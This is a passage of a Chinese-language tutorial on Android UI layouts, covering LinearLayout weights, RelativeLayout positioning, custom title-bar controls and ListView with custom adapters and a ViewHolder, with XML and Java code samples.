class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;bottom&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>android:layout_weight</strong>：设置控件比例大小</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;EditText</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/input_message&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">hint</span>=<span class="string">&quot;input&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>使用了weight属性，此时控件宽度不再由layout_width决定，且<code>android:layout_width=&quot;0dp&quot;</code>是比较规范写法，这里dp表示控件大小或者间距</p><h4 id="相对布局RelativeLayout">相对布局RelativeLayout</h4><p>控件相对于布局进行定位</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignParentL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>  <span class="comment">//位于布局左边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//位于布局右边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//位于布局顶边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//位于布局底边</span></span><br><span class="line"><span class="symbol">android:</span>layout_centerInP<span class="attr">arent</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//位于布局中间</span></span><br></pre></td></tr></table></figure><p>控件相对于其他控件进行定位</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_<span class="attr">above</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//位于相比控件上面</span></span><br><span class="line"><span class="symbol">android:</span>layout_<span class="attr">below</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//位于相比控件下面</span></span><br><span class="line"><span class="symbol">android:</span>layout_toLeftOf=<span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//位于相比控件左面</span></span><br><span class="line"><span class="symbol">android:</span>layout_toRightOf=<span class="string">&quot;@id/id—_name&quot;</span> <span class="comment">//位于相比控件右面</span></span><br></pre></td></tr></table></figure><p>另外一组</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//一个组件左边缘和另一个组件左边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//一个组件右边缘和另一个组件右边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//一个组件上边缘和另一个组件上边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//一个组件下边缘和另一个组件下边缘对齐</span></span><br></pre></td></tr></table></figure><h4 id="帧布局">帧布局</h4><p>这种布局没有方便的定位方式，组件默认摆放在布局左上角</p><p>也可以使用<code>android:layout_gravity</code>属性</p><h4 id="百分比布局">百分比布局</h4><p>只有线性布局支持layout_weight属性，相对布局和帧布局不支持。为了使这两个也可以比例分割布局引用百分比布局。在这种布局不在使用wrap_content,match_parent等方式指定控件大小，而是直接指定控件在布局中所占的百分比。</p><p>百分比布局只为帧布局，相对布局进行功能拓展–&gt;PercentFrameLayout和PercentRelativeLayout</p><p><strong>百分比布局的使用</strong></p><p>在app/build.gradle添加依赖 <code>compile 'com.android.support:percent:24.2.1'</code></p><p>最外层使用PercentFrameLayout，用完整包路径来表示，必须还定义一个app命名空间。</p><p>app:layout_heightPercent app:layout_widthPercent属性，指定百分比</p><h3 id="自定义控件">自定义控件</h3><p>常用控件和布局的继承结构</p><p><img src="assets/image-20240719141008153.png" alt="image-20240719141008153"></p><h4 id="引用布局">引用布局</h4><p><code>android:background</code>：为布局或者控件指定一个背景</p><p><code>android_layout_margin</code>：指定控件上下左右方向上偏移的距离。也可使用android_layout_marginTop等</p><p>在编写完标题布局，如下图</p><p><img src="assets/image-20240719152219494.png" alt="image-20240719152219494"></p><p>修改activity_main.xml中代码，添加如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;include <span class="attribute">layout</span>=<span class="string">&quot;@layout/title&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>同时将系统自带的标题栏隐藏</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    ActionBar actionBar=getSupportActionBar();</span><br><span class="line">    <span class="keyword">if</span>(actionBar!=<span class="literal">null</span>)&#123;</span><br><span class="line">        actionBar.hide();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义控件-2">自定义控件</h4><p>自定义控件实现上面两个Button功能，使不同活动点击这两个按钮时，分别实现各自功能，不用编写多次</p><p>新建类TitleLayout，继承LinearLayout,让他成为自定义标题栏控件,并注册按钮点击事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TitleLayout</span> <span class="keyword">extends</span> <span class="title class_">LinearLayout</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitleLayout</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">        LayoutInflater.from(context).inflate(R.layout.title,<span class="built_in">this</span>);</span><br><span class="line">        Button titleBack=findViewById(R.id.title_back);</span><br><span class="line">        Button titleEdit=findViewById(R.id.title_edit);</span><br><span class="line">        titleBack.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                ((Activity)getContext()).finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        titleEdit.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                Toast.makeText(getContext(), <span class="string">&quot;You click Edit&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：在控件中使用TitleLayout控件就会调用构造函数，构造函数中对标题栏布局进行动态加载，进而绑定按钮</p><p>inflate()函数有两个参数：第一个是加载的布局id，第二个是父布局</p><p>同时修改activity_main.xml，布局文件中添加自定义控件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ListView">ListView</h3><h4 id="ListView的简单用法">ListView的简单用法</h4><p>布局文件如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ListView</span><br><span class="line">    android:<span class="attribute">id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String[] data=&#123;<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>,            <span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(MainActivity.<span class="built_in">this</span>, android.R.layout.simple_list_item_1,data);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listview</span> <span class="operator">=</span> findViewById(R.id.list_view);</span><br><span class="line">        listview.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助ArrayAdapter适配器实现类，传入泛型String，</p><p><code>android.R.layout.simple_list_item_1</code>为ListView的子项布局id，系统内置的用于简单显示一段文本。</p><p>有了Adpter对象，用setAdapter方法将构建好的适配器对象传递进去，ListView和数据之间关联就建立完成。</p><h4 id="定制ListView的界面">定制ListView的界面</h4><p>实现 显示水果图片，旁边是水果的名字</p><p>定义类，作为ListView适配器适配类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> imageId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fruit</span><span class="params">(String name,<span class="type">int</span> imageId)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.imageId=imageId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getImageId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> imageId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义子项布局</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自定义适配器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> resourceId;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(Context context, <span class="type">int</span> textViewResourceId,</span></span><br><span class="line"><span class="params">                        List&lt;Fruit&gt; objects)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, textViewResourceId, objects);</span><br><span class="line">        resourceId = textViewResourceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// 获取当前项的Fruit实例</span></span><br><span class="line">   </span><br><span class="line">            <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>); <span class="comment">//加载子项布局</span></span><br><span class="line">        ImageView friutImage=(ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">          TextView fruitName=(TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">            fruitName.setText(fruit.getName());     </span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解析适配器</strong>：FruitApater构造方法，将上下文，子项布局ID，数据传递进来</p><p>重写getView方法，当每个子项滚动到界面内就会调用</p><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Fruit&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// 初始化水果数据</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Apple&quot;</span>, R.drawable.apple_pic);</span><br><span class="line">            fruitList.add(apple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">banana</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Banana&quot;</span>, R.drawable.banana_pic);</span><br><span class="line">            fruitList.add(banana);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">orange</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Orange&quot;</span>, R.drawable.orange_pic);</span><br><span class="line">            fruitList.add(orange);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">watermelon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Watermelon&quot;</span>, R.drawable.watermelon_pic);</span><br><span class="line">            fruitList.add(watermelon);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pear</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pear&quot;</span>, R.drawable.pear_pic);</span><br><span class="line">            fruitList.add(pear);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">grape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Grape&quot;</span>, R.drawable.grape_pic);</span><br><span class="line">            fruitList.add(grape);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pineapple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pineapple&quot;</span>, R.drawable.pineapple_pic);</span><br><span class="line">            fruitList.add(pineapple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">strawberry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Strawberry&quot;</span>, R.drawable.strawberry_pic);</span><br><span class="line">            fruitList.add(strawberry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">cherry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Cherry&quot;</span>, R.drawable.cherry_pic);</span><br><span class="line">            fruitList.add(cherry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">mango</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Mango&quot;</span>, R.drawable.mango_pic);</span><br><span class="line">            fruitList.add(mango);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>提升效率</strong></p><p>getView还有一个参数convertView，用于将之前加载的布局进行缓存，以便后面复用。</p><p>但是每次还在findViewById()方法。借助ViewHolder</p><p>修改FruitAdapter代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listviewtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// 获取当前项的Fruit实例</span></span><br><span class="line">        View view;</span><br><span class="line">        ViewHolder viewHolder;</span><br><span class="line">        <span class="keyword">if</span> (convertView == <span class="literal">null</span>) &#123;</span><br><span class="line">            view = LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>);</span><br><span class="line">            viewHolder = <span class="keyword">new</span> <span class="title class_">ViewHolder</span>();</span><br><span class="line">            viewHolder.fruitImage = (ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">            viewHolder.fruitName = (TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            view.setTag(viewHolder); <span class="comment">// 将ViewHolder存储在View中</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            view = convertView;</span><br><span class="line">            viewHolder = (ViewHolder) view.getTag(); <span class="comment">// 重新获取ViewHolder</span></span><br><span class="line">        &#125;</span><br><span class="line">        viewHolder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        